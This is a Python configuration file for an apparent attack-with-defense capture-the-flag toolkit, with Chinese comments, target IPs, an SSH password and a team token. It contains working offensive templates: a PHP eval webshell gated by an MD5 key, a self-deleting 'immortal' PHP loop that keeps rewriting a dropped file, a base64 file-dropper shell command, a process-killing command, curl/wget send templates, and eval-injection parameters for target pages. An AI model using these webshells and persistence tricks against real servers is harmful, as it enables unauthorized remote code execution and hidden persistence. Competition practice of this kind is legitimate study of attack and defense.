#use utf-8
import hashlib
import base64
import time
class BckDoorConfig:
    payload={}
    url=''
    headers={}
    method=''
    resultStartPos=''
    resultEndPos=''
    def __init__(self,payload,url,headers={'Content-Type':'application/x-www-form-urlencoded'},method='post',resultStartPos='',resultEndPos=''):
        self.payload=payload
        self.url=url
        self.headers=headers
        self.method=method
        self.resultEndPos=resultEndPos
        self.resultStartPos=resultStartPos
fileType='php5'#fileType
token='serfendTeam'#我方token
gameUrl='http://edprin.natappfree.cc'#举办方平台
ips=['192.168.8.119:8801/','192.168.8.119:8803','192.168.8.119:8804']#攻击范围 
webrootPath='/app'#网站根目录
localBkPath='project.ctf.awd.1910.py/server_bck'#备份文件存储位置
sshConfig={
    'hostname' : '192.168.8.119',
    'port' : '2202',
    'username' : 'ctf',
    'password':'f59c659bac6faf32ae17e38489c1519a',
    'pfile':''
}
dbConfig={
    'dbName':'db',
    'username':'un',
    'password':'pd'
}
rawbackdoor_list=[
    BckDoorConfig('p={0}','admin/header.php',method='get')
]#利用的洞
#BckDoorConfig('copyright={0}','index.php',method='get',resultStartPos='/h5>',resultEndPos='<h5>hello')
# BckDoorConfig('page=normaliz&mail_replacement={0}&source=a&method=/a/e','action.php',resultStartPos='',resultEndPos='<html'),
#     BckDoorConfig('page=md5&res="or eval($_POST[a]) or"&a={0};','action.php'),
#     BckDoorConfig('666={0};','1.php'),

immortalTroj_tpl="""<?php
unlink(__FILE__);
ignore_user_abort(true);
set_time_limit(0);
while (1){{
	file_put_contents('{1}',base64_decode('{0}'));
	usleep(1000);
    }}
    ?>
    
"""

backdoor_tpl="""<?php
    echo 'your id:' . md5($_GET['{0}']) . '-to-{1}';
    if (md5($_GET['{0}'])==='{1}'){{
    $tmp=base64_decode($_POST['cmd']);
    @eval($tmp);}}?>
    
    """
uploader="/bin/echo '{0}' | /usr/bin/base64 -d > {1}"
killer="killall -uwww-data"
backdoor_des=[]
backdoor_url=[]
backdoor_key=[]

httpSendModel=[
    "/usr/bin/curl {0} -d '{1}'",
    "/usr/bin/wget {0}/?{1}",
    "{0}"
]
